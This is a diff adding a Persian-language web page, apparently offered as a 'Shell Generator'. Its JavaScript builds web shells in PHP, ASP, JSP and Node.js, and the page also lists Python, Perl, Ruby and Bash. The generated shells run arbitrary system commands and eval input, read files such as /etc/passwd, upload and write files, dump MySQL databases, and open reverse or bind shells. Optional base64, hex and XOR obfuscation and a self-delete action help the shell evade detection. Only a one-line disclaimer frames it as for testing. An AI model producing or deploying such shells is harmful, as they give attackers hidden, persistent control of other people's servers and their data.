@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ساخت شل | Shell Generator</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #f5f6f8; color: #1a1d21; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 14px; line-height: 1.5; padding: 20px; }
+.wrap { max-width: 1100px; margin: 0 auto; }
+.top { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+.logo { width: 36px; height: 36px; border-radius: 8px; background: #fff; border: 1px solid #e0e3e8; display: flex; align-items: center; justify-content: center; font-family: monospace; font-size: 15px; color: #2563eb; font-weight: 700; }
+.title { font-size: 17px; font-weight: 700; }
+.sub { font-size: 12px; color: #6b7280; }
+.spacer { flex: 1; }
+.tag { font-family: monospace; font-size: 11px; color: #6b7280; background: #fff; border: 1px solid #e0e3e8; padding: 4px 10px; border-radius: 6px; }
+.notice { background: #fef9e7; border: 1px solid #f5d97a; color: #7c5a00; font-size: 12.5px; padding: 10px 14px; border-radius: 8px; margin-bottom: 18px; }
+.layout { display: grid; grid-template-columns: 320px 1fr; gap: 16px; }
+@media (max-width: 860px) { .layout { grid-template-columns: 1fr; } }
+.panel { background: #fff; border: 1px solid #e0e3e8; border-radius: 10px; }
+.panel-head { padding: 12px 16px; border-bottom: 1px solid #eef0f3; font-size: 12px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: .5px; display: flex; justify-content: space-between; align-items: center; }
+.panel-body { padding: 14px 16px; }
+.group { margin-bottom: 14px; }
+.group:last-child { margin-bottom: 0; }
+.label { display: block; font-size: 12px; color: #6b7280; margin-bottom: 6px; font-weight: 600; }
+.input, .select { width: 100%; background: #f9fafb; border: 1px solid #e0e3e8; color: #1a1d21; font-size: 13px; padding: 8px 10px; border-radius: 6px; outline: none; font-family: inherit; transition: border .15s, background .15s; }
+.input:focus, .select:focus { border-color: #2563eb; background: #fff; }
+.input.mono { font-family: monospace; font-size: 12px; }
+.row { display: flex; gap: 6px; }
+.row > .input { flex: 1; }
+.btn-mini { background: #f9fafb; border: 1px solid #e0e3e8; color: #6b7280; padding: 0 12px; border-radius: 6px; cursor: pointer; font-size: 14px; }
+.btn-mini:hover { background: #fff; border-color: #c9ced6; color: #1a1d21; }
+.tog { display: flex; align-items: center; gap: 8px; padding: 5px 0; cursor: pointer; user-select: none; font-size: 13px; }
+.tog input { appearance: none; width: 30px; height: 17px; background: #d1d5db; border-radius: 10px; position: relative; cursor: pointer; transition: background .15s; flex-shrink: 0; outline: none; }
+.tog input::after { content: ''; position: absolute; top: 1.5px; left: 1.5px; width: 14px; height: 14px; background: #fff; border-radius: 50%; transition: all .15s; box-shadow: 0 1px 2px rgba(0,0,0,.2); }
+.tog input:checked { background: #2563eb; }
+.tog input:checked::after { left: 14.5px; }
+.features { display: flex; flex-direction: column; gap: 1px; }
+.feat-hint { font-size: 11px; color: #9ca3af; padding: 2px 0 4px; font-style: italic; }
+.out-head { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid #eef0f3; }
+.out-title { font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; }
+.actions { display: flex; gap: 6px; }
+.btn { background: #f9fafb; border: 1px solid #e0e3e8; color: #1a1d21; font-size: 12.5px; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-family: inherit; font-weight: 600; transition: all .15s; }
+.btn:hover { background: #fff; border-color: #c9ced6; }
+.btn-primary { background: #2563eb; border-color: #2563eb; color: #fff; }
+.btn-primary:hover { background: #1d4ed8; border-color: #1d4ed8; }
+.output { width: 100%; min-height: 520px; background: #fafbfc; color: #1a1d21; border: none; padding: 14px; font-family: monospace; font-size: 12.5px; line-height: 1.6; resize: vertical; outline: none; display: block; border-bottom-left-radius: 10px; border-bottom-right-radius: 10px; }
+.stats { display: grid; grid-template-columns: repeat(3, 1fr); border-top: 1px solid #eef0f3; }
+.stat { padding: 10px 14px; border-left: 1px solid #eef0f3; }
+.stat:first-child { border-left: none; }
+.stat-l { font-size: 11px; color: #9ca3af; margin-bottom: 2px; }
+.stat-v { font-family: monospace; font-size: 13px; font-weight: 700; color: #1a1d21; }
+.stat-v.ok { color: #059669; }
+.help { margin-top: 18px; padding: 14px 16px; background: #fff; border: 1px solid #e0e3e8; border-radius: 10px; font-size: 13px; color: #4b5563; }
+.help-t { color: #1a1d21; font-weight: 700; margin-bottom: 8px; font-size: 13px; }
+.help code { font-family: monospace; background: #f3f4f6; padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #2563eb; }
+.help-line { direction: ltr; text-align: left; line-height: 2; font-family: monospace; font-size: 12px; }
+</style>
+
+<style>
+/* Site dark theme */
+body{background:#0b0f0d;color:#e5e7eb;}
+.logo{background:#111815;border-color:#26332c;color:#22c55e;}
+.sub,.label,.panel-head,.stat-l,.tag{color:#8fa39a;}
+.tag{background:#111815;border-color:#26332c;}
+.panel,.help{background:#101613;border-color:#26332c;}
+.panel-head,.out-head{border-color:#26332c;}
+.input,.select,.btn,.btn-mini{background:#0d1411;border-color:#2b3a31;color:#e5e7eb;}
+.input:focus,.select:focus{border-color:#22c55e;background:#101a15;}
+.btn:hover,.btn-mini:hover{background:#142019;border-color:#3c5144;color:#fff;}
+.btn-primary{background:#15803d;border-color:#15803d;color:#fff;}
+.btn-primary:hover{background:#166534;border-color:#166534;}
+.tog input{background:#37443c;}
+.tog input:checked{background:#16a34a;}
+.output{background:#0a0f0c;color:#d1fae5;}
+.stats,.stat{border-color:#26332c;}
+.stat-v{color:#e5e7eb;}
+.stat-v.ok{color:#22c55e;}
+.help{color:#a8b5ae;}
+.help-t{color:#e5e7eb;}
+.help code{background:#162019;color:#4ade80;}
+.notice{background:#111815;border-color:#2b3a31;color:#b7c7bd;}
+.back-btn{position:fixed;top:18px;right:18px;width:40px;height:40px;border-radius:10px;border:1px solid #2b3a31;background:#101613;color:#22c55e;display:flex;align-items:center;justify-content:center;text-decoration:none;z-index:20;box-shadow:0 4px 18px rgba(0,0,0,.25);}
+.back-btn:hover{background:#162019;border-color:#3c5144;}
+</style>
+
+<style id="site-back-style">.site-back{position:fixed;top:16px;right:16px;z-index:99999;width:44px;height:44px;border:1px solid rgba(255,255,255,.16);border-radius:50%;background:rgba(10,10,12,.92);color:#fff;display:grid;place-items:center;text-decoration:none;font:700 25px/1 Arial,sans-serif;box-shadow:0 12px 35px rgba(0,0,0,.45);backdrop-filter:blur(10px);transition:.2s}.site-back:hover{transform:translateY(-2px);border-color:rgba(255,255,255,.35)}@media(max-width:600px){.site-back{top:12px;right:12px;width:42px;height:42px}}</style>
+</head>
+<body>
+<a class="site-back" href="index.html" aria-label="بازگشت" title="بازگشت">‹</a>
+<a class="back-btn" href="javascript:history.back()" aria-label="Back" title="Back">↩</a>
+<div class="wrap">
+<div class="top">
+<div class="logo">$</div>
+<div>
+<div class="title"><span data-fa="ساخت شل" data-en="Shell Generator">ساخت شل</span></div>
+<div class="sub" data-fa="سازنده شل چندزبانه" data-en="Multi-language shell generator">سازنده شل چندزبانه</div>
+</div>
+<div class="spacer"></div>
+<div class="tag" id="langTag">PHP</div>
+</div>
+<div class="notice">این ابزار صرفاً برای آموزش و تست امنیتی روی سرورهای شخصی است. استفاده غیرمجاز پیگرد قانونی دارد.<br>
+
+</div></div>
+<div class="layout">
+<div class="panel">
+<div class="panel-head">پیکربندی</div>
+<div class="panel-body">
+<div class="group">
+<label class="label">زبان مقصد</label>
+<select class="select" id="lang">
+<option value="php" selected>PHP</option>
+<option value="asp">ASP Classic</option>
+<option value="jsp">Java (JSP)</option>
+<option value="node">Node.js</option>
+<option value="python">Python (Flask)</option>
+<option value="perl">Perl (CGI)</option>
+<option value="ruby">Ruby (Sinatra)</option>
+<option value="bash">Bash Script</option>
+</select>
+</div>
+<div class="group" id="execWrap">
+<label class="label">متد اجرای فرمان</label>
+<select class="select" id="execMethod"></select>
+</div>
+<div class="group">
+<label class="label">نام پارامتر فرمان</label>
+<div class="row">
+<input class="input mono" id="paramName" value="cmd">
+<button class="btn-mini" id="randomParam" type="button">↻</button>
+</div>
+</div>
+<div class="group">
+<label class="label">احراز هویت</label>
+<label class="tog"><input type="checkbox" id="authEnable"><span>فعال‌سازی کلید</span></label>
+<div id="authWrap" style="display:none;margin-top:8px;">
+<select class="select" id="authType" style="margin-bottom:6px;">
+<option value="plain" selected>متن ساده</option>
+<option value="md5">MD5</option>
+<option value="sha1">SHA1</option>
+</select>
+<input class="input mono" id="authValue" placeholder="مقدار کلید">
+</div>
+</div>
+<div class="group">
+<label class="label">مبهم‌سازی</label>
+<select class="select" id="obfuscation">
+<option value="none" selected>بدون</option>
+<option value="base64">Base64</option>
+<option value="hex">Hex</option>
+<option value="xor">XOR + Base64</option>
+<option value="split">تقسیم رشته</option>
+<option value="combo">ترکیبی</option>
+</select>
+</div>
+<div class="group" id="xorWrap" style="display:none;">
+<label class="label">کلید XOR</label>
+<input class="input mono" id="xorKey" value="s3cr3t">
+</div>
+<div class="group">
+<label class="label">قابلیت‌ها <span id="featCount" style="color:#9ca3af;font-weight:400;"></span></label>
+<div class="features" id="featuresList"></div>
+</div>
+</div>
+</div>
+<div class="panel">
+<div class="out-head">
+<div class="out-title"><span class="dot"></span><span>خروجی زنده</span></div>
+<div class="actions">
+<button class="btn" id="copyBtn" type="button">کپی</button>
+<button class="btn btn-primary" id="downloadBtn" type="button">دانلود</button>
+</div>
+</div>
+<textarea class="output" id="output" readonly spellcheck="false"></textarea>
+<div class="stats">
+<div class="stat"><div class="stat-l">حجم</div><div class="stat-v" id="statSize">0 B</div></div>
+<div class="stat"><div class="stat-l">خطوط</div><div class="stat-v" id="statLines">0</div></div>
+<div class="stat"><div class="stat-l">مبهم‌سازی</div><div class="stat-v ok" id="statObf">بدون</div></div>
+</div>
+</div>
+</div>
+<div class="help">
+<div class="help-t">راهنمای استفاده</div>
+<div class="help-line" id="helpContent"></div>
+</div>
+</div>
+<script>
+(function(){
+'use strict';
+var $ = function(id){ return document.getElementById(id); };
+var rnd = function(n){ n = n || 6; var c = 'abcdefghijklmnopqrstuvwxyz0123456789'; var o = ''; for(var i=0;i<n;i++) o += c[Math.floor(Math.random()*c.length)]; return o; };
+var b64 = function(s){ return btoa(unescape(encodeURIComponent(s))); };
+var hex = function(s){ var o = ''; for(var i=0;i<s.length;i++) o += s.charCodeAt(i).toString(16).padStart(2,'0'); return o; };
+var xorS = function(s,k){ var o = ''; for(var i=0;i<s.length;i++) o += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i%k.length)); return o; };
+var splitS = function(s,n){ var z = Math.ceil(s.length/n), o = []; for(var i=0;i<s.length;i+=z) o.push(s.slice(i,i+z)); return o; };
+var esc = function(s){ return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'"); };
+var LANGS = {
+php: {
+  name: 'PHP',
+  exec: ['system','shell_exec','passthru','exec','popen','proc_open','pcntl_exec','backtick'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان سیستم', def:true },
+    { id:'eval', label:'اجرای کد PHP (eval)', def:false },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'write', label:'نوشتن فایل', def:false },
+    { id:'upload', label:'آپلود فایل', def:true },
+    { id:'download', label:'دانلود فایل', def:true },
+    { id:'info', label:'اطلاعات سرور (phpinfo)', def:true },
+    { id:'sql', label:'اجرای کوئری MySQL', def:false },
+    { id:'mysql_dump', label:'خروجی دیتابیس MySQL', def:false },
+    { id:'reverse', label:'شل معکوس (Reverse Shell)', def:false },
+    { id:'bind', label:'بایند شل (Bind Shell)', def:false },
+    { id:'zip', label:'زیپ کردن پوشه', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list&path=/ — لیست دایرکتوری\nGET ?action=read&file=/etc/passwd — خواندن فایل\nGET ?action=info — اطلاعات سرور\nGET ?action=sql&q=SELECT+1 — اجرای کوئری'
+},
+asp: {
+  name: 'ASP',
+  exec: ['wscript.shell','shell.application'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان سیستم', def:true },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'write', label:'نوشتن فایل', def:false },
+    { id:'upload', label:'آپلود فایل', def:false },
+    { id:'download', label:'دانلود فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'sql', label:'اجرای کوئری MSSQL', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=whoami — اجرای فرمان\nGET ?action=list — لیست فایل‌ها\nGET ?action=info — اطلاعات سرور'
+},
+jsp: {
+  name: 'JSP',
+  exec: ['runtime.exec','processbuilder'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان سیستم', def:true },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'write', label:'نوشتن فایل', def:false },
+    { id:'download', label:'دانلود فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'thread', label:'لیست Thread ها', def:false },
+    { id:'env', label:'نمایش Environment', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list&path=/ — لیست دایرکتوری\nGET ?action=info — اطلاعات سرور'
+},
+node: {
+  name: 'Node.js',
+  exec: ['child_process.exec','child_process.spawn','child_process.execSync'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان', def:true },
+    { id:'eval', label:'اجرای کد JS (eval)', def:false },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'write', label:'نوشتن فایل', def:false },
+    { id:'upload', label:'آپلود فایل', def:false },
+    { id:'download', label:'دانلود فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'env', label:'نمایش Environment', def:false },
+    { id:'reverse', label:'شل معکوس', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list — لیست دایرکتوری\nGET ?action=info — اطلاعات سرور'
+},
+python: {
+  name: 'Python',
+  exec: ['subprocess.run','subprocess.Popen','os.system','os.popen'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان', def:true },
+    { id:'eval', label:'اجرای کد پایتون', def:false },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'write', label:'نوشتن فایل', def:false },
+    { id:'download', label:'دانلود فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'sql', label:'اجرای SQL', def:false },
+    { id:'reverse', label:'شل معکوس', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list — لیست دایرکتوری\nGET ?action=info — اطلاعات سرور'
+},
+perl: {
+  name: 'Perl',
+  exec: ['system','exec','backtick','qx'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان', def:true },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'reverse', label:'شل معکوس', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list — لیست دایرکتوری'
+},
+ruby: {
+  name: 'Ruby',
+  exec: ['system','backtick','IO.popen','Open3'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان', def:true },
+    { id:'eval', label:'اجرای کد Ruby', def:false },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'info', label:'اطلاعات سرور', def:true },
+    { id:'reverse', label:'شل معکوس', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'GET ?cmd=id — اجرای فرمان\nGET ?action=list — لیست دایرکتوری'
+},
+bash: {
+  name: 'Bash',
+  exec: ['bash','sh','eval'],
+  features: [
+    { id:'cmd', label:'اجرای فرمان', def:true },
+    { id:'dir', label:'لیست دایرکتوری', def:true },
+    { id:'read', label:'خواندن فایل', def:true },
+    { id:'info', label:'اطلاعات سیستم', def:true },
+    { id:'reverse', label:'شل معکوس', def:false },
+    { id:'selfdestruct', label:'خودتخریبی', def:false }
+  ],
+  help: 'chmod +x shell.sh && ./shell.sh\nGET ?cmd=id — اجرای فرمان'
+}
+};
+var state = {
+  lang: 'php',
+  execMethod: 'system',
+  paramName: 'cmd',
+  authEnabled: false,
+  authType: 'plain',
+  authValue: '',
+  obfuscation: 'none',
+  xorKey: 's3cr3t',
+  features: {}
+};
+Object.keys(LANGS).forEach(function(k){ state.features[k] = {}; LANGS[k].features.forEach(function(f){ state.features[k][f.id] = f.def; }); });
+function renderFeatures(){
+  var lang = LANGS[state.lang];
+  var wrap = $('featuresList');
+  var html = '';
+  lang.features.forEach(function(f){
+    var checked = state.features[state.lang][f.id] ? ' checked' : '';
+    html += '<label class="tog"><input type="checkbox" data-feat="'+f.id+'"'+checked+'><span>'+f.label+'</span></label>';
+  });
+  wrap.innerHTML = html;
+  wrap.querySelectorAll('input[data-feat]').forEach(function(inp){
+    inp.addEventListener('change', function(e){
+      state.features[state.lang][e.target.dataset.feat] = e.target.checked;
+      update();
+    });
+  });
+  var total = lang.features.length, on = 0;
+  lang.features.forEach(function(f){ if(state.features[state.lang][f.id]) on++; });
+  $('featCount').textContent = '(' + on + '/' + total + ')';
+}
+function renderExec(){
+  var lang = LANGS[state.lang];
+  var sel = $('execMethod');
+  sel.innerHTML = '';
+  lang.exec.forEach(function(m, i){
+    var o = document.createElement('option');
+    o.value = m; o.textContent = m;
+    if(i === 0) o.selected = true;
+    sel.appendChild(o);
+  });
+  state.execMethod = lang.exec[0];
+}
+function genPHP(p){
+  var c = '<?php\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    if(p.authType === 'plain') c += 'if(($_GET["'+ap+'"]??"") !== \''+esc(p.authValue)+'\'){die("denied");}\n';
+    else if(p.authType === 'md5') c += 'if(md5($_GET["'+ap+'"]??"") !== \''+esc(p.authValue)+'\'){die("denied");}\n';
+    else if(p.authType === 'sha1') c += 'if(sha1($_GET["'+ap+'"]??"") !== \''+esc(p.authValue)+'\'){die("denied");}\n';
+  }
+  c += '$a=$_GET["action"]??"cmd";\n';
+  var feats = p.features;
+  if(feats.cmd) c += 'if($a==="cmd"&&isset($_GET["'+p.paramName+'"])){'+p.execMethod+'($_GET["'+p.paramName+'"]);}\n';
+  if(feats.eval) c += 'elseif($a==="eval"&&isset($_POST["code"])){eval($_POST["code"]);}\n';
+  if(feats.dir) c += 'elseif($a==="list"){echo "<pre>".shell_exec("ls -la ".escapeshellarg($_GET["path"]??"."))."</pre>";}\n';
+  if(feats.read) c += 'elseif($a==="read"&&isset($_GET["file"])){echo htmlspecialchars(file_get_contents($_GET["file"]));}\n';
+  if(feats.write) c += 'elseif($a==="write"&&isset($_POST["file"])&&isset($_POST["data"])){echo file_put_contents($_POST["file"],$_POST["data"])?"ok":"fail";}\n';
+  if(feats.download) c += 'elseif($a==="download"&&isset($_GET["file"])){$f=$_GET["file"];if(file_exists($f)){header("Content-Type: application/octet-stream");header("Content-Disposition: attachment; filename=\\"".basename($f)."\\"");readfile($f);}else{echo "not found";}}\n';
+  if(feats.upload) c += 'elseif($a==="upload"&&isset($_FILES["f"])){$t=basename($_FILES["f"]["name"]);echo move_uploaded_file($_FILES["f"]["tmp_name"],$t)?"uploaded: ".$t:"failed";}\n';
+  if(feats.info) c += 'elseif($a==="info"){echo "<pre>";echo "uname: ".php_uname()."\\n";echo "user: ".(function_exists("posix_getpwuid")?posix_getpwuid(posix_geteuid())["name"]:"n/a")."\\n";echo "cwd: ".getcwd()."\\n";echo "php: ".PHP_VERSION."\\n";echo "disabled: ".ini_get("disable_functions")."\\n";echo "</pre>";}\n';
+  if(feats.sql) c += 'elseif($a==="sql"&&isset($_GET["q"])){$m=@mysqli_connect($_GET["h"]??"localhost",$_GET["u"]??"root",$_GET["p"]??"",$_GET["d"]??"");if(!$m){die("connect fail");}$r=mysqli_query($m,$_GET["q"]);if($r===true){echo "ok";}elseif($r){while($row=mysqli_fetch_row($r)){echo implode("|",$row)."\\n";}}else{echo mysqli_error($m);}mysqli_close($m);}\n';
+  if(feats.mysql_dump) c += 'elseif($a==="dump"){$m=@mysqli_connect($_GET["h"]??"localhost",$_GET["u"]??"root",$_GET["p"]??"",$_GET["d"]??"");$r=mysqli_query($m,"SHOW TABLES");while($t=mysqli_fetch_row($r)){$tb=$t[0];echo "-- $tb\\n";$r2=mysqli_query($m,"SELECT * FROM $tb");while($row=mysqli_fetch_assoc($r2)){echo implode(",",$row)."\\n";}}}\n';
+  if(feats.reverse) c += 'elseif($a==="reverse"&&isset($_GET["ip"])&&isset($_GET["port"])){$s=fsockopen($_GET["ip"],(int)$_GET["port"]);if($s){while($cmd=fgets($s)){fwrite($s,shell_exec($cmd));}fclose($s);}}\n';
+  if(feats.bind) c += 'elseif($a==="bind"){$p=(int)($_GET["port"]??4444);$s=stream_socket_server("0.0.0.0:$p");while($c=stream_socket_accept($s)){while($cmd=fgets($c)){fwrite($c,shell_exec($cmd));}fclose($c);}}\n';
+  if(feats.zip) c += 'elseif($a==="zip"&&isset($_GET["path"])){exec("zip -r ".escapeshellarg($_GET["path"]).".zip ".escapeshellarg($_GET["path"]));echo "done";}\n';
+  if(feats.selfdestruct) c += 'elseif($a==="selfdestruct"){@unlink(__FILE__);echo "gone";}\n';
+  c += '?>';
+  return c;
+}
+function genASP(p){
+  var c = '<%\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += 'If Request.QueryString("'+ap+'") <> "'+p.authValue+'" Then Response.End\n';
+  }
+  c += 'Dim a, c, s, e\n';
+  c += 'a = Request.QueryString("action")\n';
+  var f = p.features;
+  if(f.cmd) c += 'If a = "" Or a = "cmd" Then\n  c = Request.QueryString("'+p.paramName+'")\n  If c <> "" Then\n    Set s = Server.CreateObject("WScript.Shell")\n    Set e = s.Exec("cmd /c " & c)\n    Response.Write("<pre>" & e.StdOut.ReadAll & "</pre>")\n  End If\nEnd If\n';
+  if(f.dir) c += 'If a = "list" Then\n  Set s = Server.CreateObject("Scripting.FileSystemObject")\n  Set fo = s.GetFolder(Server.MapPath(Request.QueryString("path") & "."))\n  For Each x In fo.Files\n    Response.Write x.Name & " | " & x.Size & " bytes<br>"\n  Next\nEnd If\n';
+  if(f.read) c += 'If a = "read" Then\n  Set s = Server.CreateObject("Scripting.FileSystemObject")\n  Set fo = s.OpenTextFile(Server.MapPath(Request.QueryString("file")), 1)\n  Response.Write "<pre>" & Server.HTMLEncode(fo.ReadAll) & "</pre>"\n  fo.Close\nEnd If\n';
+  if(f.write) c += 'If a = "write" Then\n  Set s = Server.CreateObject("Scripting.FileSystemObject")\n  Set fo = s.CreateTextFile(Server.MapPath(Request.Form("file")), True)\n  fo.Write Request.Form("data")\n  fo.Close\n  Response.Write "ok"\nEnd If\n';
+  if(f.download) c += 'If a = "download" Then\n  Response.ContentType = "application/octet-stream"\n  Response.AddHeader "Content-Disposition", "attachment; filename=" & Request.QueryString("file")\n  Set s = Server.CreateObject("Scripting.FileSystemObject")\n  Set fo = s.OpenTextFile(Server.MapPath(Request.QueryString("file")), 1)\n  Response.Write fo.ReadAll\n  fo.Close\nEnd If\n';
+  if(f.info) c += 'If a = "info" Then\n  Response.Write "server: " & Request.ServerVariables("SERVER_SOFTWARE") & "<br>"\n  Response.Write "ip: " & Request.ServerVariables("LOCAL_ADDR") & "<br>"\n  Response.Write "path: " & Server.MapPath(".") & "<br>"\nEnd If\n';
+  if(f.sql) c += 'If a = "sql" Then\n  Dim cn, rs\n  Set cn = Server.CreateObject("ADODB.Connection")\n  cn.Open "Provider=SQLOLEDB;Data Source=" & Request.QueryString("h") & ";Initial Catalog=" & Request.QueryString("d") & ";User ID=" & Request.QueryString("u") & ";Password=" & Request.QueryString("p")\n  Set rs = cn.Execute(Request.QueryString("q"))\n  Do While Not rs.EOF\n    Response.Write rs.Fields(0) & "<br>"\n    rs.MoveNext\n  Loop\nEnd If\n';
+  if(f.selfdestruct) c += 'If a = "selfdestruct" Then\n  Set s = Server.CreateObject("Scripting.FileSystemObject")\n  s.DeleteFile Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))\n  Response.Write "gone"\nEnd If\n';
+  c += '%>';
+  return c;
+}
+function genJSP(p){
+  var c = '<%@ page import="java.util.*,java.io.*,java.net.*" %>\n<%\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += 'if(!"'+p.authValue+'".equals(request.getParameter("'+ap+'"))){response.sendError(403);return;}\n';
+  }
+  c += 'String a = request.getParameter("action");\nif(a == null) a = "cmd";\n';
+  var f = p.features;
+  if(f.cmd) c += 'if(a.equals("cmd")){\n  String cmd = request.getParameter("'+p.paramName+'");\n  if(cmd != null){\n    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});\n    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String l;\n    while((l = r.readLine()) != null){ out.println(l); }\n  }\n}\n';
+  if(f.dir) c += 'else if(a.equals("list")){\n  File d = new File(request.getParameter("path") == null ? "." : request.getParameter("path"));\n  File[] fs = d.listFiles();\n  if(fs != null){ for(File x : fs){ out.println(x.getName() + " | " + x.length()); } }\n}\n';
+  if(f.read) c += 'else if(a.equals("read")){\n  BufferedReader r = new BufferedReader(new FileReader(request.getParameter("file")));\n  String l;\n  while((l = r.readLine()) != null){ out.println(l); }\n  r.close();\n}\n';
+  if(f.write) c += 'else if(a.equals("write")){\n  FileWriter w = new FileWriter(request.getParameter("file"));\n  w.write(request.getParameter("data"));\n  w.close();\n  out.println("ok");\n}\n';
+  if(f.download) c += 'else if(a.equals("download")){\n  String f2 = request.getParameter("file");\n  response.setContentType("application/octet-stream");\n  response.setHeader("Content-Disposition","attachment; filename=" + f2);\n  FileInputStream in = new FileInputStream(f2);\n  byte[] buf = new byte[4096];\n  int n;\n  while((n = in.read(buf)) > 0){ response.getOutputStream().write(buf,0,n); }\n  in.close();\n}\n';
+  if(f.info) c += 'else if(a.equals("info")){\n  out.println("os: " + System.getProperty("os.name"));\n  out.println("user: " + System.getProperty("user.name"));\n  out.println("cwd: " + System.getProperty("user.dir"));\n  out.println("java: " + System.getProperty("java.version"));\n}\n';
+  if(f.thread) c += 'else if(a.equals("thread")){\n  Thread[] ts = new Thread[Thread.activeCount()];\n  Thread.enumerate(ts);\n  for(Thread t : ts){ if(t != null) out.println(t.getName()); }\n}\n';
+  if(f.env) c += 'else if(a.equals("env")){\n  for(Map.Entry<String,String> e : System.getenv().entrySet()){ out.println(e.getKey() + "=" + e.getValue()); }\n}\n';
+  if(f.selfdestruct) c += 'else if(a.equals("selfdestruct")){\n  new File(application.getRealPath(request.getServletPath())).delete();\n  out.println("gone");\n}\n';
+  c += '%>';
+  return c;
+}
+function genNode(p){
+  var c = 'const http = require("http");\nconst { exec } = require("child_process");\nconst fs = require("fs");\nconst PORT = 8080;\n';
+  c += 'http.createServer((req, res) => {\n  const u = new URL(req.url, "http://x");\n  const a = u.searchParams.get("action") || "cmd";\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += '  if(u.searchParams.get("'+ap+'") !== "'+p.authValue+'"){ res.writeHead(403); return res.end("denied"); }\n';
+  }
+  c += '  res.setHeader("Content-Type", "text/plain; charset=utf-8");\n';
+  var f = p.features;
+  if(f.cmd) c += '  if(a === "cmd"){\n    const cmd = u.searchParams.get("'+p.paramName+'");\n    if(!cmd) return res.end("no cmd");\n    return exec(cmd, (e, out, err) => res.end(e ? err : out));\n  }\n';
+  if(f.eval) c += '  if(a === "eval" && req.method === "POST"){\n    let body = "";\n    req.on("data", d => body += d);\n    req.on("end", () => { try{ eval(body); res.end("ok"); }catch(e){ res.end(e.message); } });\n    return;\n  }\n';
+  if(f.dir) c += '  if(a === "list"){\n    const dir = u.searchParams.get("path") || ".";\n    const list = fs.readdirSync(dir).map(n => { try{ const st = fs.statSync(dir + "/" + n); return n + (st.isDirectory() ? "/" : "") + " | " + st.size; }catch(e){ return n; } });\n    return res.end(list.join("\\n"));\n  }\n';
+  if(f.read) c += '  if(a === "read"){\n    const file = u.searchParams.get("file");\n    if(!file) return res.end("no file");\n    return res.end(fs.readFileSync(file, "utf8"));\n  }\n';
+  if(f.write) c += '  if(a === "write" && req.method === "POST"){\n    let body = "";\n    req.on("data", d => body += d);\n    req.on("end", () => { try{ const p2 = JSON.parse(body); fs.writeFileSync(p2.file, p2.data); res.end("ok"); }catch(e){ res.end(e.message); } });\n    return;\n  }\n';
+  if(f.download) c += '  if(a === "download"){\n    const file = u.searchParams.get("file");\n    if(!file || !fs.existsSync(file)) return res.end("not found");\n    return fs.createReadStream(file).pipe(res);\n  }\n';
+  if(f.info) c += '  if(a === "info"){\n    const os = require("os");\n    return res.end(JSON.stringify({ platform: os.platform(), arch: os.arch(), hostname: os.hostname(), user: os.userInfo().username, cwd: process.cwd(), node: process.version, uptime: os.uptime() }, null, 2));\n  }\n';
+  if(f.env) c += '  if(a === "env"){ return res.end(JSON.stringify(process.env, null, 2)); }\n';
